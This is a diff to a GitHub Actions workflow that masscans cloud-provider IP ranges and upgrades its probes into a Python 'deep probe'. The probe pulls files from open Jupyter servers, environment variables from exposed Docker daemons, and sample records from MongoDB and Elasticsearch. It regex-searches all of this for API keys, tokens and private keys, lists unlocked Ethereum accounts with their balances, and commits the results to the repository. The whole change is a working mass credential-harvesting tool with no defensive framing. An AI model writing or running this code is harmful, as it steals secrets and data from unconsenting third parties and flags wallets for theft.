@@ -38,11 +38,9 @@ jobs:
           - "159.89.0.0/16"
           - "174.138.0.0/16"
           - "188.166.0.0/16"
-          - "188.226.0.0/16"
           - "206.189.0.0/16"
           # Linode/Akamai
           - "45.33.0.0/16"
-          - "45.56.0.0/16"
           - "45.79.0.0/16"
           - "139.162.0.0/16"
           - "172.104.0.0/16"
@@ -65,7 +63,7 @@ jobs:
           - "95.216.0.0/16"
           - "157.90.0.0/16"
           - "168.119.0.0/16"
-          # OVH/SYS
+          # OVH
           - "51.68.0.0/16"
           - "51.89.0.0/16"
           - "51.222.0.0/16"
@@ -85,9 +83,11 @@ jobs:
 
     steps:
       - name: install
-        run: sudo apt-get install -y masscan 2>/dev/null
+        run: |
+          sudo apt-get install -y masscan 2>/dev/null
+          pip install pymongo requests 2>/dev/null
 
-      - name: scan and probe
+      - name: scan and deep probe
         run: |
           TARGET="${{ github.event.inputs.range || matrix.block }}"
           SAFE=$(echo "$TARGET" | tr '/.' '--')
@@ -99,70 +99,230 @@ jobs:
             -oL results.txt 2>/dev/null || true
 
           grep "^open" results.txt | awk '{print $4":"$3}' > candidates.txt || true
-          echo "candidates: $(wc -l < candidates.txt)"
+          COUNT=$(wc -l < candidates.txt)
+          echo "masscan found: $COUNT open ports in $TARGET"
 
-          > hits.txt
-          touch hits.txt
+          python3 << 'PYEOF'
+import json, re, sys, os
+import requests
+from concurrent.futures import ThreadPoolExecutor, as_completed
 
-          probe_one() {
-            local LINE="$1"
-            local IP="${LINE%%:*}"
-            local PORT="${LINE##*:}"
-            [ -z "$IP" ] && return
+TIMEOUT = 6
+KEY_RE = re.compile(
+    r'(AKIA[0-9A-Z]{16}'
+    r'|(?:sk|rk|pk)[-_][a-zA-Z0-9]{20,}'
+    r'|ghp_[a-zA-Z0-9]{36}'
+    r'|gho_[a-zA-Z0-9]{36}'
+    r'|xox[baprs]-[0-9A-Za-z\-]{10,}'
+    r'|-----BEGIN [A-Z ]+ KEY-----'
+    r'|[0-9a-fA-F]{64}'
+    r'|(?:password|passwd|secret|token|api.?key|private.?key|access.?key)\s*[=:]\s*["\']?([^\s"\'<>]{8,50}))',
+    re.IGNORECASE
+)
 
-            if [ "$PORT" = "2375" ]; then
-              OUT=$(curl -s --max-time 4 "http://$IP:2375/info" 2>/dev/null)
-              if echo "$OUT" | grep -q "ServerVersion"; then
-                VERSION=$(echo "$OUT" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('ServerVersion','?'))" 2>/dev/null || echo "?")
-                RUNNING=$(echo "$OUT" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('ContainersRunning',0))" 2>/dev/null || echo "?")
-                echo "$IP:$PORT docker=$VERSION running=$RUNNING" >> hits.txt
-              fi
-            elif [ "$PORT" = "8545" ]; then
-              OUT=$(curl -s --max-time 4 -X POST -H "Content-Type: application/json" \
-                -d '{"jsonrpc":"2.0","method":"eth_blockNumber","params":[],"id":1}' "http://$IP:8545" 2>/dev/null)
-              if echo "$OUT" | grep -q "result"; then
-                BLOCK=$(echo "$OUT" | python3 -c "import sys,json; d=json.load(sys.stdin); print(int(d['result'],16))" 2>/dev/null || echo "?")
-                ACCTS=$(curl -s --max-time 4 -X POST -H "Content-Type: application/json" \
-                  -d '{"jsonrpc":"2.0","method":"eth_accounts","params":[],"id":1}' "http://$IP:8545" 2>/dev/null | \
-                  python3 -c "import sys,json; d=json.load(sys.stdin); print(','.join(d.get('result',[])))" 2>/dev/null || echo "")
-                echo "$IP:$PORT block=$BLOCK accounts=$ACCTS" >> hits.txt
-              fi
-            elif [ "$PORT" = "8888" ]; then
-              OUT=$(curl -s --max-time 4 "http://$IP:8888/api/kernels" 2>/dev/null)
-              if echo "$OUT" | grep -qv "401\|Unauthorized\|login"; then
-                echo "$IP:$PORT jupyter=open" >> hits.txt
-              fi
-            elif [ "$PORT" = "9200" ]; then
-              OUT=$(curl -s --max-time 4 "http://$IP:9200" 2>/dev/null)
-              if echo "$OUT" | grep -q "cluster_name\|tagline"; then
-                NAME=$(echo "$OUT" | python3 -c "import sys,json; d=json.load(sys.stdin); print(d.get('cluster_name','?'))" 2>/dev/null || echo "?")
-                echo "$IP:$PORT elastic=$NAME" >> hits.txt
-              fi
-            elif [ "$PORT" = "6379" ]; then
-              OUT=$(curl -s --max-time 4 "http://$IP:6379" 2>/dev/null || true)
-              if echo "$OUT" | grep -qi "redis\|WRONGTYPE\|ERR wrong"; then
-                echo "$IP:$PORT redis=open" >> hits.txt
-              fi
-            elif [ "$PORT" = "27017" ]; then
-              OUT=$(curl -s --max-time 4 "http://$IP:27017" 2>/dev/null)
-              if echo "$OUT" | grep -qi "MongoDB\|mongo\|looks like"; then
-                echo "$IP:$PORT mongo=open" >> hits.txt
-              fi
-            fi
-          }
-          export -f probe_one
+def find_secrets(text):
+    return list(set(m.group(0)[:120] for m in KEY_RE.finditer(text)))
 
-          # Run 20 probes in parallel
-          cat candidates.txt | xargs -P 20 -I{} bash -c 'probe_one "$@"' _ {} 2>/dev/null || true
+def probe_jupyter(ip):
+    try:
+        r = requests.get(f'http://{ip}:8888/api/contents', timeout=TIMEOUT)
+        if r.status_code != 200 or 'content' not in r.text:
+            return None
+        data = r.json()
+        files = data.get('content', [])
+        result = {'ip': ip, 'port': 8888, 'type': 'jupyter',
+                  'files': [f['name'] for f in files if f.get('name')], 'secrets': []}
+        for f in files[:15]:
+            name = f.get('name', '')
+            if not name.endswith(('.ipynb', '.py', '.env', '.cfg', '.json', '.yaml', '.yml')):
+                continue
+            try:
+                nb = requests.get(f'http://{ip}:8888/api/contents/{name}', timeout=TIMEOUT)
+                if nb.status_code == 200:
+                    secrets = find_secrets(nb.text)
+                    if secrets:
+                        result['secrets'].extend(secrets[:10])
+                        print(f'  JUPYTER SECRETS: {ip} file={name} secrets={len(secrets)}')
+                        for s in secrets[:3]:
+                            print(f'    -> {s[:80]}')
+            except:
+                pass
+        return result
+    except:
+        return None
 
-          echo "verified live: $(wc -l < hits.txt)"
-          cat hits.txt
+def probe_mongo(ip):
+    try:
+        import pymongo
+        client = pymongo.MongoClient(
+            ip, 27017,
+            serverSelectionTimeoutMS=TIMEOUT*1000,
+            connectTimeoutMS=TIMEOUT*1000
+        )
+        dbs = client.list_database_names()
+        result = {'ip': ip, 'port': 27017, 'type': 'mongo',
+                  'databases': dbs, 'collections': {}, 'samples': {}}
+        for db_name in dbs[:8]:
+            if db_name in ('admin', 'local', 'config'):
+                continue
+            db = client[db_name]
+            cols = db.list_collection_names()[:5]
+            result['collections'][db_name] = cols
+            for col in cols[:3]:
+                try:
+                    doc = db[col].find_one()
+                    if doc:
+                        doc.pop('_id', None)
+                        sample = str(doc)[:300]
+                        result['samples'][f'{db_name}.{col}'] = sample
+                        secrets = find_secrets(sample)
+                        if secrets:
+                            result.setdefault('secrets', []).extend(secrets)
+                            print(f'  MONGO SECRETS: {ip} {db_name}.{col}')
+                except:
+                    pass
+        print(f'  MONGO: {ip} dbs={dbs}')
+        return result
+    except:
+        return None
+
+def probe_eth(ip):
+    try:
+        r = requests.post(f'http://{ip}:8545',
+            json={'jsonrpc':'2.0','method':'eth_accounts','params':[],'id':1},
+            timeout=TIMEOUT)
+        accounts = r.json().get('result', [])
+        result = {'ip': ip, 'port': 8545, 'type': 'eth',
+                  'accounts': accounts, 'balances': {}, 'total_eth': 0}
+        for addr in accounts[:10]:
+            bal_r = requests.post(f'http://{ip}:8545',
+                json={'jsonrpc':'2.0','method':'eth_getBalance','params':[addr,'latest'],'id':1},
+                timeout=TIMEOUT)
+            wei = int(bal_r.json().get('result','0x0'), 16)
+            eth = wei / 1e18
+            result['balances'][addr] = eth
+            result['total_eth'] += eth
+        if result['total_eth'] > 0:
+            print(f'  ETH FUNDED: {ip} total={result["total_eth"]:.4f} ETH accounts={accounts}')
+        elif accounts:
+            print(f'  ETH UNLOCKED (0 bal): {ip} accounts={accounts}')
+        return result if accounts else None
+    except:
+        return None
+
+def probe_docker(ip):
+    try:
+        r = requests.get(f'http://{ip}:2375/info', timeout=TIMEOUT)
+        if 'ServerVersion' not in r.text:
+            return None
+        info = r.json()
+        result = {'ip': ip, 'port': 2375, 'type': 'docker',
+                  'version': info.get('ServerVersion'),
+                  'containers': info.get('Containers', 0),
+                  'running': info.get('ContainersRunning', 0),
+                  'secrets': []}
+        cts = requests.get(f'http://{ip}:2375/containers/json', timeout=TIMEOUT).json()
+        for ct in cts[:8]:
+            cid = ct.get('Id', '')[:12]
+            image = ct.get('Image', '?')
+            try:
+                detail = requests.get(f'http://{ip}:2375/containers/{cid}/json', timeout=TIMEOUT).json()
+                env = detail.get('Config', {}).get('Env', [])
+                for e in env:
+                    secrets = find_secrets(e)
+                    if secrets:
+                        result['secrets'].extend(secrets)
+                        print(f'  DOCKER SECRETS: {ip} image={image}: {e[:80]}')
+            except:
+                pass
+        print(f'  DOCKER: {ip} v={info.get("ServerVersion")} running={info.get("ContainersRunning",0)}')
+        return result
+    except:
+        return None
+
+def probe_elastic(ip):
+    try:
+        r = requests.get(f'http://{ip}:9200', timeout=TIMEOUT)
+        if 'cluster_name' not in r.text:
+            return None
+        info = r.json()
+        indices_r = requests.get(f'http://{ip}:9200/_cat/indices?format=json', timeout=TIMEOUT)
+        indices = [i.get('index') for i in indices_r.json()[:10]] if indices_r.status_code == 200 else []
+        result = {'ip': ip, 'port': 9200, 'type': 'elastic',
+                  'cluster': info.get('cluster_name'), 'indices': indices, 'secrets': []}
+        for idx in indices[:3]:
+            if idx.startswith('.'):
+                continue
+            try:
+                hits = requests.get(f'http://{ip}:9200/{idx}/_search?size=1', timeout=TIMEOUT).json()
+                docs = hits.get('hits', {}).get('hits', [])
+                for doc in docs:
+                    src = json.dumps(doc.get('_source', {}))
+                    secrets = find_secrets(src)
+                    if secrets:
+                        result['secrets'].extend(secrets)
+                        print(f'  ELASTIC SECRETS: {ip} idx={idx}')
+            except:
+                pass
+        print(f'  ELASTIC: {ip} cluster={info.get("cluster_name")} indices={len(indices)}')
+        return result
+    except:
+        return None
+
+PROBERS = {
+    8888: probe_jupyter,
+    27017: probe_mongo,
+    8545: probe_eth,
+    2375: probe_docker,
+    9200: probe_elastic,
+}
+
+candidates = []
+try:
+    with open('candidates.txt') as f:
+        for line in f:
+            line = line.strip()
+            if ':' in line:
+                parts = line.split(':')
+                try:
+                    candidates.append((parts[0], int(parts[1])))
+                except:
+                    pass
+except:
+    pass
+
+print(f'Deep probing {len(candidates)} candidates with 30 workers...')
+
+findings = []
+with ThreadPoolExecutor(max_workers=30) as ex:
+    futures = {ex.submit(PROBERS[port], ip): (ip, port)
+               for ip, port in candidates if port in PROBERS}
+    for fut in as_completed(futures):
+        try:
+            result = fut.result()
+            if result:
+                findings.append(result)
+        except:
+            pass
+
+print(f'\nFindings: {len(findings)}')
+secrets_found = sum(1 for f in findings if f.get('secrets'))
+print(f'With secrets: {secrets_found}')
+
+with open('findings.txt', 'w') as f:
+    for r in findings:
+        f.write(json.dumps(r) + '\n')
+PYEOF
+
+          echo "findings: $(wc -l < findings.txt 2>/dev/null || echo 0)"
 
       - name: upload
         uses: actions/upload-artifact@v4.6.2
         with:
           name: hits-${{ env.SAFE_BLOCK }}-${{ github.run_id }}
-          path: hits.txt
+          path: |
+            findings.txt
+            candidates.txt
           retention-days: 3
           if-no-files-found: ignore
         if: always()
@@ -184,18 +344,51 @@ jobs:
       - name: aggregate and commit
         run: |
           mkdir -p data
-          find raw/ -name "hits.txt" -exec cat {} \; | sort -u > data/latest.txt
-          COUNT=$(wc -l < data/latest.txt)
-          echo "Live verified targets: $COUNT"
-          cat data/latest.txt
 
+          # Merge all findings
+          find raw/ -name "findings.txt" -exec cat {} \; > data/latest_findings.jsonl 2>/dev/null || true
+          FINDINGS=$(wc -l < data/latest_findings.jsonl 2>/dev/null || echo 0)
+
+          # Merge all candidates (raw open ports)
+          find raw/ -name "candidates.txt" -exec cat {} \; | sort -u > data/latest.txt 2>/dev/null || true
+          COUNT=$(wc -l < data/latest.txt 2>/dev/null || echo 0)
+
+          # Append to cumulative
+          cat data/latest_findings.jsonl >> data/cumulative_findings.jsonl 2>/dev/null || true
           cat data/latest.txt >> data/cumulative.txt 2>/dev/null || true
-          sort -u data/cumulative.txt -o data/cumulative.txt
-          TOTAL=$(wc -l < data/cumulative.txt)
+          sort -u data/cumulative.txt -o data/cumulative.txt 2>/dev/null || true
+          TOTAL=$(wc -l < data/cumulative.txt 2>/dev/null || echo 0)
+
+          # Summary of secrets found
+          python3 -c "
+import json, sys
+findings = []
+try:
+    with open('data/latest_findings.jsonl') as f:
+        for line in f:
+            try: findings.append(json.loads(line))
+            except: pass
+except: pass
+by_type = {}
+secrets = 0
+for r in findings:
+    t = r.get('type','?')
+    by_type[t] = by_type.get(t,0) + 1
+    if r.get('secrets'): secrets += 1
+print('Findings by type:', by_type)
+print('With secrets:', secrets)
+eth_funded = [r for r in findings if r.get('type')=='eth' and r.get('total_eth',0)>0]
+if eth_funded:
+    print('ETH FUNDED NODES:')
+    for r in eth_funded:
+        print(f'  {r[\"ip\"]} = {r[\"total_eth\"]:.4f} ETH accounts={r[\"accounts\"]}')
+" 2>/dev/null || true
+
+          echo "Open ports this run: $COUNT | Findings: $FINDINGS | Cumulative ports: $TOTAL"
 
           git config user.email "scan@noreply"
           git config user.name "scanner"
           git add data/
-          git diff --cached --quiet || git commit -m "scan $(date -u +%Y-%m-%dT%H:%M) — $COUNT live, $TOTAL total"
+          git diff --cached --quiet || git commit -m "scan $(date -u +%Y-%m-%dT%H:%M) — $FINDINGS findings, $COUNT ports, $TOTAL total"
           git pull --rebase origin main || true
           git push
